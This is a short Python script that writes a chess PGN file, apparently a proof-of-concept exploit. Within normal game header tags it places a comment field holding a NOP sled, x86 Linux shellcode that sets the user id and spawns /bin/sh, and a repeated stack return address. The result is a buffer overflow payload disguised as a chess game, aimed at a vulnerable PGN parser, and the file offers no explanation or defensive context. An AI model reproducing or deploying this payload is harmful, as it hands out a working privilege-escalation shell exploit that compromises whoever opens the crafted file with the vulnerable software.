fw=open("dummy2.pgn","wb")
fw.write(b'[Event "State Ch."]\n')
fw.write(b'[White "Capablanca"]\n')
fw.write(b'[Black "Jaffe"]\n')
fw.write(b'[Result "1-0"]\n')
fw.write(b'[Board "4r3/6P1/2p2P1k/1p6/pP2p1R1/P1B5/2P2K2/3r4"]\n')
fw.write(b'[CommentSTX]\n')
fw.write(b'\x90' * 806+b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'+b'\x68\xec\xff\xbf'*50)
fw.write(b'\n[CommentEND]\n')
fw.close()


